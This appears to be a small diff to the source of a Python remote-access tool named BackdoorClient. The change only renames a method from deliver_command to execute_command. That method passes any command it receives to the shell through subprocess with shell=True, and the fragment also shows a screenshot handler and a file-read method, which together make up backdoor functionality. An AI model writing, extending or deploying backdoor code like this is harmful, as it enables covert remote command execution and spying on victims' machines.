@@ -33,7 +33,7 @@ class BackdoorClient:
             except ValueError:
                 continue
     
-    def deliver_command(self, command):
+    def execute_command(self, command):
         return subprocess.check_output(command, shell=True).decode('utf-8')
     
     def read_file(self, path):
@@ -90,7 +90,7 @@ class BackdoorClient:
                     self.take_screenshot(command[1])
 
                 else:
-                    command_output = self.deliver_command(command)
+                    command_output = self.execute_command(command)
 
 
 
